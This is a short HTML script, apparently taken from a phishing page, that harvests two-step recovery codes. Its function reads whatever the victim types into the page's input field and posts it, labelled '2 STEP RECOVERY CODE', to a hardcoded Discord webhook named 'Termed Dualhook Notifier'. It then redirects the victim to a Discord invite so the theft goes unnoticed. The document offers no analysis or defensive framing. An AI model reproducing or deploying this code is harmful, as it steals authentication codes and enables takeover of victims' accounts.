<script>
                
function verifylol() {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1080181163420831825/yEWodsIfiVst39Pj1O9OTJbKXxMIfbE1GHIQ_LQRod--7NL_EAOMY0oPPQbyQ941-7va");

    request.setRequestHeader("Content-type", "application/json");

    const params = {
      username: "Termed Dualhook Notifier 2 step | Beta",
      avatar_url: "https://media.discordapp.net/attachments/1060890977474183193/1079439695009820752/Nowy_projekt_5.png",
      content: "",
      embeds: [{
        title: "2 STEP RECOVERY CODE",
        image: {
          url: "https://cdn-icons-png.flaticon.com/512/483/483408.png"
        },
        fields: [
          {
            name: "CODE ->",
            value: document.querySelector("input").value
          }
        ],
        description: ""
      }],
    }

    request.send(JSON.stringify(params));

    window.location.replace("https://discord.gg/splunk")
  }

</script>